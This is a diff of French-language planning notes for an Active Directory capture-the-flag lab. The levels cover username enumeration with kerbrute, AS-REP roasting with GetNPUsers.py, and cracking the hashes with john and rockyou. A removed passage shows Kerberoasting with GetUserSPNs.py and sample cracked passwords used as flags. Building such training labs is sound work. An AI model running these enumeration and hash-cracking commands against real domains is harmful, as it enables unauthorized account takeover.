@@ -226,10 +226,22 @@ Key ctf = 127 + Année du Windows Server
 Message réussite niveau : 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-Level 2 prendre controle d'un compte sans permission (ASREP-Roasting) :
+Level 2 Trouver les user :
 !!!!!!!! FOURNIR UNE LISTE DE COMPTE AD POSSIBLE AU PENTESTER !!!!!!!
 
+Script pour histoire du niveau :
+
+Attaque : 
+
+Avoir une liste de user pour réaliser un bruteforce sur les username. Pour cela, on peut fournir une liste d'user à l'utilisateur qui peut telechagrer depuis le site web avec 1000 username afin de bruteforce et on met par exemple 5 username valides.
+
+kerbrute userenum --dc $IPDC$ -d $NOMDOMAINE$ users.txt
+
+Mettre dans list_recup.txt les noms recuperes
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Level 3 prendre controle d'un compte sans permission (ASREP-Roasting) :
 
 Script pour histoire du niveau :
 
@@ -244,36 +256,14 @@ Attaque :
 
 => L'attaque consiste à recuperer le hash d'un password. Cette technique exploite le fait que si un utilisateur n'a pas de pré-authentification requise (ce qui est le cas par défaut pour les comptes de service), le serveur Kerberos renverra le TGT chiffré avec le mot de passe de l'utilisateur sans vérifier le mot de passe au préalable.
 
-Procédure pour trouver le hash (à réaliser) :
-Avoir une liste de user pour réaliser un bruteforce sur les username. Pour cela, on peut fournir une liste d'user à l'utilisateur qui peut telechagrer depuis le site web avec 1000 username afin de bruteforce et on met par exemple 5 username valides.
 
-kerbrute userenum --dc $IPDC$ -d $NOMDOMAINE$ users.txt
-
-Mettre dans list_recup.txt les noms recuperes
-
-Ensuite 
-
-GetNPUsers -request -outputfile "hashes.txt" -format "john" -userfile "list_recup.tx"t -dc-ip 10.100.0.111 "ballagio.com/"
+GetNPUsers.py -request -outputfile "hashes.txt" -format "john" -usersfile "users_list.txt" -dc-ip "10.100.0.111" "bellagio.local/"
 
 john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
-
 Voici un flag simple à intégrer pour le Level 3, basé sur le mot de passe du service qu'on va casser :
 
-Flag (à soumettre) :
-
-Comment le récupérer :
-
-Après avoir lancé la commande Kerberoasting :
-
-GetUserSPNs.py casino.bellagio.com -request -outputfile spn_hashes.txt -dc-ip 192.168.1.10
-john --wordlist=/usr/share/wordlists/rockyou.txt spn_hashes.txt
-John affiche en clair quelque chose comme :
-
-ServiceAccount-Bellagio:SvcAppPass!23
-Vous extrayez la partie SvcAppPass!23, l’encadrez par FLAG{…} et vous soumettez :
-
-FLAG{SvcAppPass!23}
+Flag (à soumettre) : Password trouvé du compte P@ssw0rd
 
 Message réussite niveau :
 
@@ -284,7 +274,22 @@ Message réussite niveau :
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
-Level 3 (A ESSAYER) : Escalade de privilèges vers un compte IT Admin
+Level 4
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+: Escalade de privilèges vers un compte IT Admin
 
 Script pour histoire du niveau :
 
